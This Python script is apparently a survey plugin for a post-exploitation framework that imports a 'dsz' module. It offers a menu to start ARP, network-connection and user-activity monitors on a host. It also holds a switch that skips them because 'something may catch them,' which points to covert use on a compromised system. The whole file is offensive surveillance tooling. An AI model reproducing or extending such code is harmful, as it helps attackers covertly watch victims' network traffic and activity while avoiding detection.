
import dsz
import ops, ops.survey, ops.env
import util.menu
import ops.networking.connections
from ops.project import start_monitor

def start_arpmon():
    cmd = ops.cmd.getDszCommand('arp -monitor -delay 10s')
    start_monitor(cmd, mon_display=False, cache_tag=ops.networking.connections.ARP_MONITOR_TAG, save_delay=15, cache_size=1, use_volatile=True)
    ops.info('Arp monitor started (or already running)')

def start_netmon():
    cmd = ops.cmd.getDszCommand('netconnections -monitor')
    start_monitor(cmd, mon_display=False, cache_tag=ops.networking.connections.NETSTAT_MONITOR_TAG, save_delay=15, cache_size=1, use_volatile=True)
    ops.info('Netconnections monitor started (or already running)')

def start_activitymon():
    cmd = ops.cmd.getDszCommand('activity -monitor')
    start_monitor(cmd, mon_display=True, cache_tag='OPS_ACTIVITY_MONITOR', save_delay=15, cache_size=1, use_volatile=True)
    ops.info('Activity monitor started (or already running)')

def main():
    ops.survey.print_header('Monitors')
    if ops.env.bool('OPS_NOMONITORS'):
        ops.warn('Not starting any monitors, something may catch them.')
        return
    menu = util.menu.Menu(None, [['Full - arp, netstat, activity'], ['Netstat and activity'], ['Activity only']], ['Monitors'], 'Select your monitors (full recommended for most situations):')
    response = None
    while ((response < 1) or (response > 4)):
        response = menu.show(1)[0]
    if (response <= 3):
        start_activitymon()
    if (response <= 2):
        start_netmon()
    if (response <= 1):
        start_arpmon()
if ((__name__ == '__main__') or (('PLUGIN' in dir(ops.survey)) and (__name__ == ops.survey.PLUGIN))):
    main()